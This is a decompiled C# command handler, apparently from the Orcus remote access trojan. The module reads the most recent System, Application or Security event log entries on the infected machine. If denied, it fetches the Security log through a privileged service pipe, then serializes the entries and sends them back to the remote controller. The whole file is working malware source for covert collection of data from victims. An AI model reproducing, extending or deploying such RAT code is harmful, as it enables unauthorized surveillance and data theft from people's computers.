using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Commands.EventLog;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.EventLog;

internal class EventLogCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected I4, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		EventLogCommunication val = (EventLogCommunication)parameter[0];
		if ((int)val == 0)
		{
			EventLogType val2 = (EventLogType)parameter[1];
			EventLog val3 = (EventLog)((int)val2 switch
			{
				0 => (object)new EventLog("System"), 
				1 => (object)new EventLog("Application"), 
				2 => (object)new EventLog("Security"), 
				_ => throw new ArgumentOutOfRangeException(), 
			});
			int num = BitConverter.ToInt32(parameter, 2);
			List<EventLogEntry> list = null;
			try
			{
				int num2 = val3.get_Entries().get_Count() - num;
				int num3 = val3.get_Entries().get_Count() - num - 301;
				if (num3 < 0)
				{
					num3 = 0;
				}
				list = new List<EventLogEntry>();
				for (int i = num3; i < num2; i++)
				{
					EventLogEntry val4 = val3.get_Entries().get_Item(i);
					List<EventLogEntry> list2 = list;
					EventLogEntry val5 = new EventLogEntry();
					val5.set_EntryType((EventLogEntryType)val4.get_EntryType());
					val5.set_EventId(val4.get_EventID());
					val5.set_Source(val4.get_Source());
					val5.set_Timestamp(val4.get_TimeGenerated());
					val5.set_Message(val4.get_Message());
					list2.Add(val5);
				}
			}
			catch (SecurityException)
			{
				if (ServiceConnection.Current.IsConnected)
				{
					list = ServiceConnection.Current.Pipe.GetSecurityEventLog(300);
				}
				if (list == null)
				{
					((Command)this).ResponseByte((byte)2, connectionInfo);
					return;
				}
			}
			byte[] array = new Serializer(typeof(List<EventLogEntry>)).Serialize((object)list.OrderByDescending((EventLogEntry x) => x.get_Timestamp()).ToList());
			byte[] array2 = new byte[array.Length + 5];
			array2[0] = 1;
			Array.Copy(BitConverter.GetBytes(num), 0, array2, 1, 4);
			Array.Copy(array, 0, array2, 5, array.Length);
			connectionInfo.CommandResponse((Command)(object)this, array2, (PackageCompression)0);
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	protected override uint GetId()
	{
		return 6u;
	}
}
